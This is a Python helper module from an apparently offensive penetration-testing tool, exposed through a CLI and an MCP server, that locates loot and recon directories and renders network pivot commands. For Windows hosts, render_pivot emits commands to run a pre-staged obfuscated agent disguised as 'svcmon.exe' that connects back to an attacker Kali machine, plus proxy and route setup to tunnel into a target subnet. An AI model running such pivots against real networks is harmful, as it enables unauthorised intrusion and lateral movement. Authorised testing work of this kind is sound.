"""Shared engagement helpers used by the CLI and the MCP server.

Post-strip: yhwach is a memory database, not a task executor — this module keeps
only the two pure utilities both surfaces still need (locating artifact dirs,
rendering the pivot commands the operator runs by hand).
"""
from __future__ import annotations

from pathlib import Path


def artifact_dir(db_path: Path | str, name: str) -> Path:
    """Locate an engagement artifact dir (recon/loot/...) relative to the DB.

    For the canonical layout (<lab>/state/yhwach.db) this is <lab>/<name>; for a
    flat DB path it is <db_dir>/<name>, so a bare /tmp/x.db never resolves to /.
    """
    p = Path(db_path)
    if p.parent.name == "state":
        return p.parent.parent / name
    return p.parent / name


def render_pivot(via_ip: str, subnet: str, os_name: str | None, lport: int = 11601) -> list[str]:
    """Render the commands to stand up a pivot from `via_ip` into `subnet`.

    Windows pivots use the pre-staged obfuscated agent (svcmon.exe); other hosts
    use a stock Ligolo agent. Kali-side proxy/route commands are included. This
    is proposal-tier — the operator runs it."""
    lines = [f"== Pivot via {via_ip} ({os_name or 'os?'}) -> {subnet} =="]
    if (os_name or "").lower().startswith("win"):
        lines += [
            f"  # On the pivot ({via_ip}, Windows): run the pre-staged agent",
            f"  $ svcmon.exe -connect <KALI-IP>:{lport} -ignore-cert",
        ]
    else:
        lines += [
            f"  # On the pivot ({via_ip}): drop + run a Ligolo agent",
            f"  $ ./agent -connect <KALI-IP>:{lport} -ignore-cert",
        ]
    lines += [
        "  # Kali side — start the proxy, add the tun, route the subnet:",
        f"  $ sudo ./proxy -selfcert -laddr 0.0.0.0:{lport}",
        f"  $ sudo ip route add {subnet} dev ligolo",
    ]
    return lines
